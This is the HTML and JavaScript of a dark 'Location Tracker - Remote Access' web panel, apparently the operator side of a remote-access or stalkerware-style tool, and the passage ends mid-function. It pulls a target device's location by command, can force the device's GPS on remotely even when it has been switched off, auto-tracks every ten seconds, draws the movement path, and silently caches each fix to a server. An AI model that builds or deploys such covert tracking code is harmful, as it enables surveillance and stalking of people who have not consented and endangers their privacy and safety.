<!doctype html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Location Tracker - Remote Access</title>
    <!-- Local Leaflet Assets -->
    <link rel="stylesheet" href="/css/vendor/leaflet.css" />
    <script src="/js/vendor/leaflet.js"></script>
    <link rel="stylesheet" href="/css/hacker-theme.css" />
    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet" />
    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
    <style>
        :root {
            --font-display:
                "Satoshi", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            --font-mono:
                "Satoshi", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
        }

        /* ===== LAYOUT ===== */
        body {
            overflow: hidden;
            padding: 0;
            margin: 0;
            height: 100vh;
            font-family: var(--font-display) !important;
        }

        body::before {
            display: none;
        }

        .app-layout {
            display: flex;
            flex-direction: column;
            height: 100vh;
            width: 100vw;
        }

        /* ===== TOP BAR ===== */
        .top-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            background: var(--bg-panel);
            border-bottom: 1px solid var(--border);
            flex-shrink: 0;
            z-index: 1000;
        }

        .top-bar-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .top-bar .pg-icon {
            width: 36px;
            height: 36px;
            background: linear-gradient(135deg,
                    rgba(0, 255, 65, 0.12),
                    rgba(0, 255, 65, 0.04));
            border: 1px solid rgba(0, 255, 65, 0.25);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--accent);
            box-shadow: 0 0 12px rgba(0, 255, 65, 0.06);
        }

        .top-bar .pg-title {
            font-family: var(--font-display);
            font-size: 0.95rem;
            font-weight: 700;
            color: #e8e8e8;
        }

        .top-bar .pg-title span {
            color: var(--accent);
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }

        .top-bar .pg-sub {
            font-family: var(--font-display);
            font-size: 0.55rem;
            color: var(--text-muted);
            letter-spacing: 1px;
            margin-top: 1px;
        }

        .top-bar-actions {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .btn-icon {
            width: 34px;
            height: 34px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
        }

        .btn-icon:hover {
            border-color: rgba(0, 255, 65, 0.25);
            color: var(--accent);
            box-shadow: 0 0 8px rgba(0, 255, 65, 0.06);
        }

        .btn-icon.active {
            background: rgba(0, 255, 65, 0.08);
            border-color: rgba(0, 255, 65, 0.25);
            color: var(--accent);
        }

        /* ===== MAP AREA ===== */
        .map-wrap {
            flex: 1;
            position: relative;
            min-height: 0;
        }

        #map {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 1;
        }

        /* Dark map filter — inverts OSM/Google light tiles into dark theme */
        #map .leaflet-tile-pane {
            filter: invert(100%) hue-rotate(180deg) brightness(95%) contrast(90%) !important;
        }
        /* Override Leaflet's mix-blend-mode: plus-lighter which washes out the dark filter */
        #map .leaflet-tile-pane img.leaflet-tile {
            mix-blend-mode: normal !important;
            filter: none !important;
        }
        #map .leaflet-container, #map {
            background: #0a0e17 !important;
        }

        /* Leaflet overrides */
        .leaflet-control-zoom a {
            background: var(--bg-panel) !important;
            color: var(--accent) !important;
            border-color: var(--border) !important;
            border-radius: 6px !important;
        }

        .leaflet-control-zoom a:hover {
            background: var(--bg-card) !important;
            box-shadow: 0 0 8px rgba(0, 255, 65, 0.06) !important;
        }

        .leaflet-popup-content-wrapper {
            background: var(--bg-panel) !important;
            color: var(--text-primary) !important;
            border: 1px solid var(--border) !important;
            border-radius: 10px !important;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.6) !important;
        }

        .leaflet-popup-tip {
            background: var(--bg-panel) !important;
            border: 1px solid var(--border) !important;
        }

        .leaflet-popup-close-button {
            color: var(--text-muted) !important;
        }

        /* ===== BOTTOM INFO BAR ===== */
        .info-bar {
            display: flex;
            align-items: center;
            gap: 0;
            padding: 0;
            background: var(--bg-panel);
            border-top: 1px solid var(--border);
            flex-shrink: 0;
            z-index: 1000;
            overflow-x: auto;
        }

        .info-chip {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 10px 14px;
            flex: 1;
            min-width: 65px;
            border-right: 1px solid var(--border);
            transition: background 0.2s;
        }

        .info-chip:hover {
            background: rgba(0, 255, 65, 0.02);
        }

        .info-chip:last-child {
            border-right: none;
        }

        .info-chip .label {
            font-family: var(--font-display);
            font-size: 0.55rem;
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 3px;
        }

        .info-chip .value {
            font-family: var(--font-mono);
            font-size: 0.75rem;
            font-weight: 400;
            color: var(--text-primary);
            font-variant-numeric: tabular-nums;
        }

        .info-chip .value.accent {
            color: var(--accent);
            text-shadow: 0 0 6px rgba(0, 255, 65, 0.15);
        }

        /* ===== FAB CONTROLS ===== */
        .float-controls {
            position: absolute;
            bottom: 20px;
            right: 20px;
            z-index: 500;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .fab {
            width: 42px;
            height: 42px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            border: 1px solid;
            transition: all 0.2s;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.4);
            position: relative;
            overflow: hidden;
        }

        .fab:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.5);
        }

        .fab:active {
            transform: scale(0.93);
        }

        .fab-refresh {
            background: rgba(0, 255, 65, 0.08);
            border-color: rgba(0, 255, 65, 0.25);
            color: var(--accent);
        }

        .fab-refresh:hover {
            background: rgba(0, 255, 65, 0.14);
            box-shadow: 0 0 14px rgba(0, 255, 65, 0.08);
        }

        .fab-refresh.loading {
            pointer-events: none;
            opacity: 0.4;
            padding: 0;
            text-align: center;
            font-size: inherit;
            position: relative;
        }

        .fab-refresh.loading::before,
        .fab-refresh.loading::after {
            content: none;
            display: none;
            animation: none;
        }

        .fab-refresh.loading .fab-ic {
            animation: spin-icon 0.8s linear infinite;
        }

        @keyframes spin-icon {
            to {
                transform: rotate(360deg);
            }
        }

        .fab-gps {
            background: rgba(255, 170, 0, 0.06);
            border-color: rgba(255, 170, 0, 0.2);
            color: var(--warning);
        }

        .fab-gps:hover {
            background: rgba(255, 170, 0, 0.12);
            box-shadow: 0 0 12px rgba(255, 170, 0, 0.1);
        }

        .fab-gps.active {
            background: rgba(0, 255, 65, 0.08);
            border-color: rgba(0, 255, 65, 0.25);
            color: var(--accent);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.06);
        }

        .fab-auto {
            background: rgba(0, 170, 255, 0.06);
            border-color: rgba(0, 170, 255, 0.2);
            color: var(--info);
        }

        .fab-auto.active {
            background: rgba(0, 170, 255, 0.12);
            border-color: rgba(0, 170, 255, 0.35);
            box-shadow: 0 0 12px rgba(0, 170, 255, 0.1);
            animation: pulse-auto 2s ease-in-out infinite;
        }

        @keyframes pulse-auto {

            0%,
            100% {
                box-shadow: 0 0 8px rgba(0, 170, 255, 0.1);
            }

            50% {
                box-shadow: 0 0 18px rgba(0, 170, 255, 0.25);
            }
        }

        .fab-gmaps {
            background: rgba(255, 170, 0, 0.06);
            border-color: rgba(255, 170, 0, 0.15);
            color: #ff9800;
        }

        .fab-gmaps:hover {
            background: rgba(255, 170, 0, 0.12);
        }

        .fab-gmaps.disabled {
            opacity: 0.2;
            pointer-events: none;
        }

        /* ===== HISTORY PANEL ===== */
        .history-panel {
            position: absolute;
            bottom: 20px;
            left: 20px;
            z-index: 500;
            background: var(--bg-panel);
            border: 1px solid var(--border);
            border-radius: 10px;
            max-height: 240px;
            max-width: 300px;
            overflow: hidden;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.5);
            display: none;
            backdrop-filter: blur(12px);
        }

        .history-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 14px;
            border-bottom: 1px solid var(--border);
            background: var(--bg-card);
        }

        .history-header span {
            font-family: var(--font-display);
            font-size: 0.7rem;
            font-weight: 600;
            color: var(--accent);
            letter-spacing: 1px;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .history-close {
            color: var(--text-muted);
            cursor: pointer;
            transition: color 0.2s;
            background: none;
            border: none;
            display: flex;
            align-items: center;
        }

        .history-close:hover {
            color: var(--danger);
        }

        .history-list {
            max-height: 190px;
            overflow-y: auto;
            padding: 2px 0;
        }

        .h-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 8px 14px;
            font-size: 0.7rem;
            transition: background 0.15s;
            cursor: pointer;
            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
        }

        .h-item:hover {
            background: rgba(0, 255, 65, 0.03);
        }

        .h-time {
            font-family: var(--font-mono);
            color: var(--text-muted);
            flex-shrink: 0;
            margin-right: 12px;
            font-variant-numeric: tabular-nums;
            font-size: 0.65rem;
        }

        .h-coords {
            font-family: var(--font-mono);
            color: var(--text-secondary);
            font-variant-numeric: tabular-nums;
            font-size: 0.65rem;
        }

        /* ===== INIT OVERLAY ===== */

        .init-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 100;
            background: rgba(10, 14, 23, 0.92);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            transition: opacity 0.5s ease;
        }

        .init-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .init-spinner {
            width: 36px;
            height: 36px;
            border: 2px solid var(--border);
            border-top: 2px solid var(--accent);
            border-radius: 50%;
            animation: spin-icon 0.8s linear infinite;
            margin-bottom: 16px;
        }

        .init-text {
            font-family: var(--font-display);
            font-size: 1rem;
            font-weight: 300;
            color: var(--text-primary);
            margin-bottom: 4px;
            letter-spacing: 1px;
        }

        .init-sub {
            font-family: var(--font-display);
            font-size: 0.7rem;
            color: var(--text-muted);
            letter-spacing: 0.5px;
        }

        /* ===== GPS OVERLAY ===== */
        .gps-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 200;
            background: rgba(10, 14, 23, 0.94);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .gps-overlay.show {
            display: flex;
        }

        .gps-overlay .gps-icon {
            width: 64px;
            height: 64px;
            border-radius: 16px;
            background: linear-gradient(135deg,
                    rgba(0, 255, 65, 0.1),
                    rgba(0, 255, 65, 0.03));
            border: 1px solid rgba(0, 255, 65, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--accent);
            margin-bottom: 18px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.06);
        }

        .gps-overlay .gps-title {
            font-family: var(--font-display);
            font-size: 1rem;
            font-weight: 700;
            color: var(--accent);
            margin-bottom: 8px;
            letter-spacing: 1px;
            text-transform: uppercase;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.15);
        }

        .gps-overlay .gps-desc {
            font-family: var(--font-display);
            font-size: 0.75rem;
            color: var(--text-secondary);
            margin-bottom: 24px;
            max-width: 280px;
            line-height: 1.6;
        }

        .gps-overlay .gps-btn {
            padding: 10px 24px;
            background: rgba(0, 255, 65, 0.08);
            border: 1px solid rgba(0, 255, 65, 0.25);
            border-radius: 8px;
            color: var(--accent);
            font-family: var(--font-display);
            font-size: 0.75rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .gps-overlay .gps-btn:hover {
            background: rgba(0, 255, 65, 0.14);
            box-shadow: 0 0 14px rgba(0, 255, 65, 0.08);
        }

        .gps-overlay .gps-btn.loading {
            opacity: 0.4;
            pointer-events: none;
        }

        /* ===== TOAST ===== */
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            transform: translateY(80px);
            z-index: 99999;
            padding: 10px 18px;
            background: var(--bg-panel);
            border: 1px solid var(--border);
            border-left: 3px solid var(--accent);
            border-radius: 8px;
            font-family: var(--font-display);
            font-size: 0.7rem;
            font-weight: 500;
            color: var(--text-primary);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            pointer-events: none;
            max-width: 320px;
            text-align: left;
            letter-spacing: 0.3px;
            white-space: nowrap;
        }

        .toast.show {
            transform: translateY(0);
        }

        .toast.error {
            border-color: rgba(255, 51, 51, 0.4);
            color: var(--danger);
            background: rgba(30, 10, 10, 0.95);
        }

        .toast.success {
            border-color: rgba(0, 255, 65, 0.3);
            color: var(--accent);
            background: rgba(10, 25, 15, 0.95);
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 768px) {
            .top-bar {
                padding: 8px 16px;
            }

            .top-bar .pg-icon {
                width: 32px;
                height: 32px;
            }

            .top-bar .pg-title {
                font-size: 0.85rem;
            }

            .info-chip {
                padding: 8px 12px;
            }

            .info-chip .value {
                font-size: 0.7rem;
            }
        }

        @media (max-width: 600px) {
            .top-bar {
                padding: 8px 14px;
            }

            .top-bar .pg-title {
                font-size: 0.8rem;
            }

            .top-bar .pg-sub {
                display: none;
            }

            .info-chip {
                padding: 6px 10px;
            }

            .info-chip .label {
                font-size: 0.5rem;
                letter-spacing: 1.5px;
            }

            .info-chip .value {
                font-size: 0.65rem;
            }

            .fab {
                width: 38px;
                height: 38px;
                border-radius: 8px;
            }

            .history-panel {
                max-width: 240px;
                bottom: 16px;
                left: 16px;
            }

            .float-controls {
                bottom: 16px;
                right: 16px;
            }
        }

        @media (max-width: 480px) {
            .top-bar .pg-icon {
                width: 28px;
                height: 28px;
                border-radius: 6px;
            }

            .top-bar .pg-title {
                font-size: 0.75rem;
            }

            .btn-icon {
                width: 30px;
                height: 30px;
                border-radius: 6px;
            }

            .info-chip .label {
                font-size: 0.45rem;
            }

            .info-chip .value {
                font-size: 0.6rem;
            }

            .fab {
                width: 36px;
                height: 36px;
            }
        }

        @media (max-width: 380px) {
            .top-bar {
                padding: 6px 10px;
            }

            .info-chip {
                padding: 5px 8px;
                min-width: 50px;
            }

            .fab {
                width: 34px;
                height: 34px;
            }
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
        }

        @keyframes pulse-glow {

            0%,
            100% {
                box-shadow: 0 0 6px rgba(0, 255, 65, 0.1);
            }

            50% {
                box-shadow: 0 0 14px rgba(0, 255, 65, 0.3);
            }
        }
    </style>
</head>

<body>
    <div class="app-layout" role="main">
        <!-- Top Bar -->
        <nav class="top-bar" role="navigation" aria-label="Location tracker controls">
            <div class="top-bar-left">
                <div class="pg-icon">
                    <i data-lucide="map-pin" style="width: 16px; height: 16px"></i>
                </div>
                <div>
                    <div class="pg-title"><span>Location</span> Tracker</div>
                    <div class="pg-sub">// gps &amp; network</div>
                </div>
            </div>
            <div class="top-bar-actions">
                <button class="btn-icon" id="btn-history" title="History" aria-label="Toggle location history panel">
                    <i data-lucide="clock" style="width: 15px; height: 15px"></i>
                </button>
                <a href="javascript:window.history.back()" class="btn-icon" title="Go Back" aria-label="Go back to previous page">
                    <i data-lucide="arrow-left" style="width: 15px; height: 15px"></i>
                </a>
            </div>
        </nav>

        <!-- Map Area -->
        <div class="map-wrap" role="region" aria-label="Map showing device location">
            <div id="map" role="application" aria-label="Interactive map"></div>

            <!-- Initial overlay -->
            <div class="init-overlay" id="init-overlay" role="status" aria-live="polite">
                <div class="init-spinner" aria-hidden="true"></div>
                <div class="init-text">Fetching device location...</div>
                <div class="init-sub">GPS &amp; network triangulation</div>
            </div>

            <!-- GPS Enable Overlay -->
            <div class="gps-overlay" id="gps-overlay">
                <div class="gps-icon">
                    <i data-lucide="map-pin-off" style="width: 28px; height: 28px"></i>
                </div>
                <div class="gps-title">Location Services Off</div>
                <div class="gps-desc">
                    The device's GPS is disabled. Enable it remotely to get accurate
                    location data.
                </div>
                <button class="gps-btn" id="btn-enable-gps" onclick="enableGPS()">
                    <i data-lucide="navigation" style="width: 14px; height: 14px"></i>
                    Enable GPS
                </button>
            </div>

            <!-- History Panel -->
            <div class="history-panel" id="history-panel" role="complementary" aria-label="Location history">
                <div class="history-header">
                    <span><i data-lucide="map-pin" style="width: 12px; height: 12px"></i>
                        History</span>
                    <button class="history-close" id="history-close" aria-label="Close history panel">
                        <i data-lucide="x" style="width: 14px; height: 14px"></i>
                    </button>
                </div>
                <div class="history-list" id="history-list" role="list"></div>
            </div>

            <!-- Floating Action Buttons -->
            <div class="float-controls">
                <button class="fab fab-gmaps disabled" id="btn-gmaps" title="Open in Google Maps"
                    aria-label="Open current location in Google Maps">
                    <i data-lucide="globe" style="width: 18px; height: 18px"></i>
                </button>
                <button class="fab fab-gps" id="btn-gps" title="Enable GPS" aria-label="Enable device GPS remotely">
                    <i data-lucide="satellite" style="width: 18px; height: 18px"></i>
                </button>
                <button class="fab fab-auto" id="btn-auto" title="Auto-Track (10s)"
                    aria-label="Toggle auto-tracking every 10 seconds">
                    <i data-lucide="timer" class="fab-ic" style="width: 18px; height: 18px"></i>
                </button>
                <button class="fab fab-refresh" id="btn-refresh" title="Refresh Location"
                    aria-label="Get current device location">
                    <i data-lucide="refresh-cw" class="fab-ic" style="width: 18px; height: 18px"></i>
                </button>
            </div>
        </div>

        <!-- Bottom Info Bar -->
        <div class="info-bar" role="status" aria-label="Location data" aria-live="polite">
            <div class="info-chip">
                <span class="label">LAT</span>
                <span class="value accent" id="val-lat">--</span>
            </div>
            <div class="info-chip">
                <span class="label">LNG</span>
                <span class="value accent" id="val-lng">--</span>
            </div>
            <div class="info-chip">
                <span class="label">ACC</span>
                <span class="value" id="val-acc">--</span>
            </div>
            <div class="info-chip">
                <span class="label">ALT</span>
                <span class="value" id="val-alt">--</span>
            </div>
            <div class="info-chip">
                <span class="label">SPD</span>
                <span class="value" id="val-spd">--</span>
            </div>
            <div class="info-chip">
                <span class="label">SRC</span>
                <span class="value" id="val-src">--</span>
            </div>
        </div>
    </div>

    <span class="sr-only" id="sr-announce" aria-live="polite"></span>
    <div class="toast" id="toast" role="alert" aria-live="assertive"></div>

    <script src="/js/api.js"></script>
    <script src="/js/smart-ui.js"></script>
    <script src="/js/call-notification.js"></script>
    <script>
        lucide.createIcons();
        // ===== INIT =====
        const deviceId = new URLSearchParams(window.location.search).get(
            "deviceId",
        );
        if (!deviceId) window.location.href = "index.html";

        let currentLat = null,
            currentLng = null;
        let marker, accuracyCircle, pathLine;
        let locationHistory = [];
        let autoInterval = null;
        let pathCoords = [];
        let gpsEnabled = false;

        // ===== MAP SETUP =====
        const map = L.map("map", {
            center: [20.5937, 78.9629],
            zoom: 5,
            zoomControl: true,
            attributionControl: false,
        });

        // ===== TILE LAYER FALLBACK SYSTEM =====
        const tileProviders = [
            "https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}",
            "https://tile.openstreetmap.org/{z}/{x}/{y}.png",
            "https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/{z}/{y}/{x}"
        ];
        
        let currentProviderIndex = 0;
        
        const mapTileLayer = L.tileLayer(tileProviders[currentProviderIndex], {
            maxZoom: 19,
            attribution: 'Tiles'
        }).addTo(map);

        // DEBUG PANEL: Tells us what is actually happening on the device
        const debugPanel = document.createElement('div');
        debugPanel.style.cssText = "position:absolute; top:60px; right:10px; background:rgba(0,0,0,0.8); color:#0f0; padding:10px; z-index:9999; border-radius:5px; font-family:monospace; max-width:300px; font-size:12px;";
        debugPanel.innerHTML = "<b>MAP DEBUG v3</b><br>Loading: " + tileProviders[0].split('/')[2] + "<br>";
        document.getElementById('map').appendChild(debugPanel);

        mapTileLayer.on('tileload', function() {
             if(debugPanel.innerHTML.indexOf("SUCCESS") === -1) {
                 debugPanel.innerHTML += "<span style='color:green'>SUCCESS: Tiles loaded!</span><br>";
             }
        });

        // Auto-switch on error
        mapTileLayer.on('tileerror', function(error) {
            debugPanel.innerHTML += "<span style='color:red'>FAIL: " + error?.tile?.src?.split('/')[2] + "</span><br>";
            if (currentProviderIndex < tileProviders.length - 1) {
                currentProviderIndex++;
                debugPanel.innerHTML += "Switching to: " + tileProviders[currentProviderIndex].split('/')[2] + "<br>";
                mapTileLayer.setUrl(tileProviders[currentProviderIndex]);
            } else {
                debugPanel.innerHTML += "<span style='color:red; font-weight:bold'>ALL PROVIDERS BLOCKED</span><br>";
            }
        });

        // Recalculate size after layout
        setTimeout(() => map.invalidateSize(), 100);
        setTimeout(() => map.invalidateSize(), 500);
        window.addEventListener("resize", () => map.invalidateSize());

        // Custom pulsing marker
        const pulseIcon = L.divIcon({
            className: "",
            html: `
                <div style="position:relative;width:28px;height:28px;">
                    <div style="
                        position:absolute; top:6px; left:6px;
                        width:16px; height:16px;
                        background: #00ff41;
                        border: 3px solid rgba(10, 14, 23, 0.9);
                        border-radius: 50%;
                        box-shadow: 0 0 12px rgba(0,255,65,0.6);
                        z-index: 2;
                    "></div>
                    <div style="
                        position:absolute; top:0; left:0;
                        width:28px; height:28px;
                        background: rgba(0,255,65,0.2);
                        border-radius: 50%;
                        animation: pulse-ring 2s ease-out infinite;
                        z-index: 1;
                    "></div>
                </div>
                <style>
                    @keyframes pulse-ring {
                        0% { transform: scale(1); opacity: 0.5; }
                        100% { transform: scale(2.5); opacity: 0; }
                    }
                </style>
            `,
            iconSize: [28, 28],
            iconAnchor: [14, 14],
        });

        // ===== ENABLE GPS REMOTELY =====
        async function enableGPS() {
            const btn = document.getElementById("btn-enable-gps");
            const gpsBtn = document.getElementById("btn-gps");
            btn.classList.add("loading");
            btn.textContent = "Enabling...";

            try {
                const result = await api.sendCommand(deviceId, "enable_gps", {});
                const data = result.data || result;

                if (data.settingsOpened) {
                    // Settings opened but couldn't auto-toggle — use confirmed action flow
                    btn.textContent = "Enable GPS";
                    btn.classList.remove("loading");
                    api
                        .confirmedAction(deviceId, "enable_gps", {}, "Enable GPS", {
                            skipHome: true, // Already on settings screen
                            skipLock: false,
                            actionDelay: 500,
                            onDone: () => {
                                document
                                    .getElementById("gps-overlay")
                                    .classList.remove("show");
                                gpsEnabled = true;
                                document.getElementById("btn-gps").classList.add("active");
                                showToast("GPS enabled ✓", false, true);
                                setTimeout(() => fetchLocation(), 1500);
                            },
                            onClose: () => fetchLocation(),
                        })
                        .catch(() => { });
                } else {
                    gpsEnabled = true;
                    gpsBtn.classList.add("active");
                    gpsBtn.title = "GPS Enabled";
                    document.getElementById("gps-overlay").classList.remove("show");
                    showToast("GPS enabled ✓", false, true);
                    announce("GPS has been enabled on the device");
                    fetchLocation();
                }
            } catch (err) {
                showToast("Failed to enable GPS: " + err.message, true);
                btn.textContent = "Retry";
                btn.classList.remove("loading");
            }
        }

        // Toggle GPS from FAB button
        async function toggleGPS() {
            const gpsBtn = document.getElementById("btn-gps");

            if (gpsEnabled) {
                try {
                    await api.sendCommand(deviceId, "disable_gps", {});
                    gpsEnabled = false;
                    gpsBtn.classList.remove("active");
                    gpsBtn.title = "Enable GPS";
                    showToast("GPS disabled");
                } catch (err) {
                    showToast("Failed: " + err.message, true);
                }
            } else {
                try {
                    const result = await api.sendCommand(deviceId, "enable_gps", {});
                    const data = result.data || result;
                    if (data.settingsOpened) {
                        api
                            .confirmedAction(deviceId, "enable_gps", {}, "Enable GPS", {
                                skipHome: true,
                                skipLock: false,
                                actionDelay: 500,
                                onDone: () => {
                                    gpsEnabled = true;
                                    gpsBtn.classList.add("active");
                                    showToast("GPS enabled ✓", false, true);
                                    setTimeout(() => fetchLocation(), 1500);
                                },
                            })
                            .catch(() => { });
                    } else {
                        gpsEnabled = true;
                        gpsBtn.classList.add("active");
                        gpsBtn.title = "GPS Enabled";
                        showToast("GPS enabled ✓", false, true);
                        fetchLocation();
                    }
                } catch (err) {
                    showToast("Failed: " + err.message, true);
                }
            }
        }

        // ===== FETCH LOCATION =====
        async function fetchLocation() {
            const btn = document.getElementById("btn-refresh");
            const overlay = document.getElementById("init-overlay");

            btn.classList.add("loading");

            try {
                const result = await api.sendCommand(deviceId, "get_location", {});
                const loc = result.data || result;

                if (loc.latitude !== undefined) {
                    updateMap(loc);
                    updateStats(loc);
                    addHistory(loc);
                    overlay.classList.add("hidden");
                    document.getElementById("gps-overlay").classList.remove("show");
                    gpsEnabled = true;
                    document.getElementById("btn-gps").classList.add("active");
                    showToast(
                        `Updated • ${loc.provider || "GPS"} • ±${(loc.accuracy || 0).toFixed(0)}m`,
                        false,
                        true,
                    );
                    announce(
                        `Location updated. Latitude ${loc.latitude.toFixed(4)}, Longitude ${loc.longitude.toFixed(4)}`,
                    );
                } else {
                    // Location service is off — show overlay and OFF status
                    overlay.classList.add("hidden");
                    document.getElementById("gps-overlay").classList.add("show");
                    showLocationOff();
                    showToast("GPS is OFF on the device", true);
                    announce("Failed to get location. GPS is disabled on device.");
                }
            } catch (err) {
                const msg = (err.message || "").toLowerCase();
                overlay.classList.add("hidden");
                if (
                    msg.includes("location") ||
                    msg.includes("gps") ||
                    msg.includes("provider") ||
                    msg.includes("disabled")
                ) {
                    document.getElementById("gps-overlay").classList.add("show");
                    showLocationOff();
                } else {
                    showToast(`Error: ${err.message}`, true);
                }
                announce(`Location error: ${err.message}`);
            } finally {
                btn.classList.remove("loading");
            }
        }

        // ===== UPDATE MAP =====
        function updateMap(loc) {
            const lat = loc.latitude;
            const lng = loc.longitude;
            const acc = loc.accuracy || 0;

            currentLat = lat;
            currentLng = lng;

            // Enable Google Maps button
            document.getElementById("btn-gmaps").classList.remove("disabled");

            // Remove old layers
            if (marker) map.removeLayer(marker);
            if (accuracyCircle) map.removeLayer(accuracyCircle);

            // Place marker
            marker = L.marker([lat, lng], { icon: pulseIcon }).addTo(map);
            marker.bindPopup(`
                <div style="font-size:12px; line-height: 1.8; padding: 4px;">
                    <b style="color:#00ff41; font-size:13px;">📍 DEVICE LOCATION</b><br>
                    <span style="color:#3a5a3a;">LAT:</span> <span style="color:#00ff41;">${lat.toFixed(6)}</span><br>
                    <span style="color:#3a5a3a;">LNG:</span> <span style="color:#00ff41;">${lng.toFixed(6)}</span><br>
                    <span style="color:#3a5a3a;">ACC:</span> <span style="color:#00aaff;">±${acc.toFixed(0)}m</span><br>
                    <span style="color:#3a5a3a;">SRC:</span> <span style="color:#ffaa00;">${loc.provider || "--"}</span><br>
                    <span style="color:#3a5a3a;">TIME:</span> ${new Date().toLocaleTimeString()}<br>
                    <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank"
                       style="color:#00aaff; text-decoration:none; font-size:11px; margin-top:4px; display:inline-block;">
                        > OPEN_GMAPS →
                    </a>
                </div>
            `);

            // Accuracy circle
            if (acc > 0 && acc < 5000) {
                accuracyCircle = L.circle([lat, lng], {
                    radius: acc,
                    color: "#00ff41",
                    fillColor: "#00ff41",
                    fillOpacity: 0.05,
                    weight: 1.5,
                    opacity: 0.2,
                    dashArray: "6 4",
                }).addTo(map);
            }

            // Draw path line
            pathCoords.push([lat, lng]);
            if (pathLine) map.removeLayer(pathLine);
            if (pathCoords.length > 1) {
                pathLine = L.polyline(pathCoords, {
                    color: "#00aaff",
                    weight: 2,
                    opacity: 0.4,
                    dashArray: "8 5",
                }).addTo(map);
            }

            map.setView([lat, lng], Math.max(map.getZoom(), 16), { animate: true });
        }

        // ===== UPDATE STATS =====
        function updateStats(loc) {
            document.getElementById("val-lat").textContent = (
                loc.latitude || 0
            ).toFixed(6);
            document.getElementById("val-lat").style.color = "#00e676";
            document.getElementById("val-lng").textContent = (
                loc.longitude || 0
            ).toFixed(6);
            document.getElementById("val-lng").style.color = "#00e676";
            document.getElementById("val-acc").textContent = loc.accuracy
                ? `±${loc.accuracy.toFixed(0)}m`
                : "--";
            document.getElementById("val-alt").textContent = loc.altitude
                ? `${loc.altitude.toFixed(1)}m`
                : "--";
            document.getElementById("val-spd").textContent = loc.speed
                ? `${(loc.speed * 3.6).toFixed(1)}km/h`
                : "--";
            document.getElementById("val-src").textContent = (
                loc.provider || "--"
            ).toUpperCase();
        }

        // ===== SHOW LOCATION OFF STATUS =====
        function showLocationOff() {
            document.getElementById("val-lat").textContent = "OFF";
            document.getElementById("val-lat").style.color = "#ff5252";
            document.getElementById("val-lng").textContent = "OFF";
            document.getElementById("val-lng").style.color = "#ff5252";
            document.getElementById("val-acc").textContent = "--";
            document.getElementById("val-alt").textContent = "--";
            document.getElementById("val-spd").textContent = "--";
            document.getElementById("val-src").textContent = "OFF";
            gpsEnabled = false;
            document.getElementById("btn-gps").classList.remove("active");
        }

        // ===== HISTORY =====
        function addHistory(loc) {
            locationHistory.unshift({
                lat: loc.latitude,
                lng: loc.longitude,
                time: new Date().toLocaleTimeString(),
                acc: loc.accuracy,
            });
            if (locationHistory.length > 100) locationHistory.pop();
            renderHistory();

            // Auto-cache to server (fire & forget)
            fetch("/api/device/" + deviceId + "/locations/cache", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    latitude: loc.latitude,
                    longitude: loc.longitude,
                    accuracy: loc.accuracy || null,
                    altitude: loc.altitude || null,
                    speed: loc.speed || null,
                    provider: loc.provider || null,
                }),
            }).catch(function () { });
        }

        function renderHistory() {
            const list = document.getElementById("history-list");
            list.innerHTML = locationHistory
                .map(
                    (h, i) => `
